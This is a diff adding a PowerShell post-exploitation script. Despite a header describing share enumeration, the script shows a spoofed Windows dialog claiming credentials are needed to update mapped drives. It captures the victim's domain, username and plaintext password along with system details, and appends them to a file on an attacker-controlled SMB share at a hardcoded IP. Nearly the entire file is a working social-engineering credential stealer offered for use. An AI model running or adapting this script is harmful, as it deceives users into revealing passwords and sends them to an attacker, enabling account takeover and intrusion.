@@ -1,0 +1,94 @@
+<################################################################################
+Powershell Password SE capture
+By:Matt Molda
+
+Powershell script will enumerate share information of a remote system or multiple system
+using a supplied password.  This can be modified and uploaded to run post-exploitation.
+###################################################################################>
+
+$myWindowsID=[System.Security.Principal.WindowsIdentity]::GetCurrent()
+$myWindowsPrincipal=new-object System.Security.Principal.WindowsPrincipal($myWindowsID)
+$adminRole=[System.Security.Principal.WindowsBuiltInRole]::Administrator
+if ($myWindowsPrincipal.IsInRole($adminRole))
+   {
+   $isadmin = 1
+   }
+else
+   {
+$isadmin = 0
+   }
+# PUll info to build intelligent credential window
+$sysname = (Get-ChildItem env:computername) 
+$sysname = ($sysname.Value)
+$username = (Get-ChildItem env:username)
+$username = ($username.Value)
+$userdomain = (Get-ChildItem env:UserDomain)
+$userdomain = ($userdomain.Value)
+$userinfo = ($userdomain + "\" + $username)
+$caption = ("Windows Needs Your Current Credentials")
+$msg = "Windows needs your credentials to update mapped network drives. Please enter Username and Password, using Domain\User -Example: (US\username)"
+#$creds = Get-Credential -Message 'Windows needs your credentials to update Mapped Drives. Please enter Username and Password, using Domain\User -Example: (US\username)' -UserName $userinfo 
+function Get-Credential ($caption, $userdomain, $msg, $userinfo) {$host.ui.PromptForCredential($caption, $msg, $userinfo, $userdomain) }
+write-host $userinfo
+$creds = $Host.UI.PromptForCredential($caption, $msg, $userinfo, $userdomain)
+$username = ($creds.Username)
+$domain = ($creds.GetNetworkCredential().Domain)
+$password = ($creds.GetNetworkCredential().password)
+# Pull out all sorts of information on the remote system and write to log
+$victimhost = (Get-ChildItem env:computername)
+$victimhost = $victimhost.Value
+$rootdrive = (Get-ChildItem env:systemdrive)
+$rootdrive = $rootdrive.Value
+$logonserver = (Get-ChildItem env:logonserver)
+$logonserver = $logonserver.Value
+$psversion = (Get-Host).Version.Major
+$os = get-wmiobject win32_operatingsystem | select caption,servicepackmajorversion
+<# Used for testing script
+write-host 'User Provided Creds' -ForegroundColor Cyan
+write-host '********************************************' -ForegroundColor Green
+write-host 'Domain: ' $domain
+write-host 'User Name: ' $username
+write-host 'Password: ' $password
+write-host 'System Name: ' $victimhost
+if ($isadmin -eq 1) {write-host 'Is Administrator: True'}
+else 
+{write-host 'Is Adminsitrator: False or UAC might be enabled'}
+write-host '********************************************' -ForegroundColor Green
+#>
+<# This section connect to remote evil attackers share and outputs results
+Make sure to change hacker IP address before running!
+#>
+$passwordfile = "passwords.txt"
+$shareip = "192.168.0.6"
+$sharename = "powershellSE"
+$sharepath = ("\\" + $shareip + "\" + $sharename)
+$testpath = Test-Path $sharepath
+$passwordtxt = ($sharepath + "\" + $passwordfile)
+if ($testpath -eq "TRUE") {}
+else
+{
+break
+ }
+if(!(Test-Path -Path $passwordfile))
+{
+new-item -Path $sharepath -Value $passwordfile -itemtype file
+}
+else
+{
+}
+Add-Content -value "*****************************************************************************" -Path $passwordtxt
+Add-Content -value ("Domain: " + $domain) -path $passwordtxt
+Add-Content -value ("User Name: " + $username) -path $passwordtxt
+Add-Content -value ("Password: " + $password) -path $passwordtxt
+Add-Content -Value ("System Name: " + $victimhost) -path $passwordtxt
+Add-Content -Value ("Logon Server: " + $logonserver) -path $passwordtxt
+Add-Content -Value ("Root Drive Letter: " + $rootdrive) -path $passwordtxt
+Add-Content -Value ("Powershell Major Version: " + $psversion) -path $passwordtxt
+Add-Content -Value ("OS Type: " + $os) -path $passwordtxt
+Add-Content -value "*****************************************************************************" -Path $passwordtxt
+Add-Content $passwordtxt "`n"
+
+
+
+
+
